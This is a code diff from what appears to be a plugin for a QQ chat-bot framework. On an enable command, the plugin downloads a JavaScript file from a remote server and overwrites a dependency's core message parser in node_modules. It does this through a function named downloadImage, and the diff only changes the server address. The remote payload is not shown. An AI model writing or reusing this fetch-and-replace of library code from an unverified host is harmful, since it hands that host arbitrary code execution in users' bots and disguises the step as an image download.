@@ -262,7 +262,7 @@ export class San_AddFace extends plugin {
         //logger.info(match)
         const tag = match[2]
         if (tag == "开启") {
-            let url = 'https://121.40.198.168:8888/down/iq3AY9MJ6XD7.js'
+            let url = 'https://sanluo.icu:11111/down/RdDzehzqewKw.js'
             await tool.downloadImage(url, "node_modules/icqq/lib/message/parser.js")
             let Cfg = await tool.readyaml('./plugins/San-plugin/config/config.yaml')
             Cfg["add-face"] = "open"
